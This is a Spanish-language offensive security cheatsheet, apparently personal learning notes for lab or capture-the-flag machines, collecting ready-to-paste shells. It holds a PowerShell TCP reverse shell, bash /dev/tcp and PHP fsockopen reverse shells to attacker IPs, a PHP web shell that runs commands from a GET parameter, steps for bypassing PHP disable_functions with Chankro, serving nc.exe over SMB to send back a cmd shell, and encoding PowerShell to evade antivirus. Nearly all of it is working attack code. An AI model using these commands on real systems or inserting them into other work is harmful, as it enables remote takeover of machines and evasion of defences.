# Shell Cheatsheet

## POWERSHELL

```
$client = New-Object System.Net.Sockets.TCPClient("10.10.16.30",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$cosa = (Get-Location);$sendback2  = $sendback + $cosa + "# " ;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## BASH

```
bash -i >& /dev/tcp/10.10.16.22/443 0>&1
bash -c 'bash -i >& /dev/tcp/10.0.16.22/443 0>&1'
```

## PHP

### Formulario de comandos

Reverse WebShell, te activa un formulario web que te permite funcionar como si de una shell se tratase

```
<?php

echo"<html>";

echo "<form method=GET><input type=text name=c style=width:400px;'><input type=submit value=Execute style='height:34px;'></form>";

echo "<pre>";
$a = system($_GET["c"]);
echo "</pre></html>";
?>
```

Una vez con lo anterior puedes mandarte una reverse Shell por línea de comandos

```
php -r '$sock=fsockopen("10.10.16.30",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Reverse Shell PHP

Te envía a través de php una shell en un puerto que tengas a la escucha

Podéis obtenerla aquí [http://pentestmonkey.net/tools/web-shells/php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)

### Bypass PHP

Para hacer bypass de funciones deshabilitadas en PHP

```
git clone https://github.com/TarlogicSecurity/Chankro
cd Chankro
nano command.sh
```

Escribes un comando que quieras usar en un archivo bash

```
#!/bin/bash

whoami
whoami > whoami_command.txt #Este puede servir para saltarse algunas reglas de firewall
```

A continuación inicias programa

```
python chankro.py --arch64 --input command.sh --output chankro.php --path /var/www/html
```

Hay que averiguar el punto exacto donde se está subiendo la reverse shell para incluirlo en path, y una vez realizado este comando te entrega un chankro.php que es el que tienes que subir a la web. Y en principio deberías tener ya la información si vas a la ruta en la que chankro ha subido toda la parafernalia.

{% embed url="https://www.tarlogic.com/blog/evadir-disable_functions-open_basedir/" %}

## NETCAT

A través de netcat tenemos varias técnicas que nos permiten establecer una reverse shell.

### Binario Netcat en Windows

```
locate nc.exe #en caso de no tenerlo podemos descargar el de sqlninja
```

Nos compartimos un servidor de red samba para enviar el binario

```
impacket-smbserver smbFolder $(pwd) -smb2support
```

En la máquina atacada queremos realizar el siguiente comando

```
echo "\\10.10.10.10\smbFolder\nc.exe -e cmd 10.10.10.10 443" > content #Básicamente que ejecute el binario a través del recurso compartido y que nos envíe una shell a nuestra máquina
wget https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py #Lo vamos a usar para bypassear antivirus y defensas
python ps_encoder.py -s content #Te da una cadena que llamaremos "cadenaencode"
powershell -enc cadenaencode
```

## Evil-Winrm

Evil-WinRM es una shell que usa WinRM [https://www.hackplayers.com/2019/10/evil-winrm-shell-winrm-para-pentesting.html](https://www.hackplayers.com/2019/10/evil-winrm-shell-winrm-para-pentesting.html)

```
gem install evil-winrm
evil-winrm -i IP -u usuario -p contraseña
```



> \*Disclaimer: Este manual está realizado en base a lo que voy aprendiendo, si parte de la información que comparto no es correcta estaré encantado de que te pongas en contacto conmigo para hacérmelo saber y poder modificarlo.
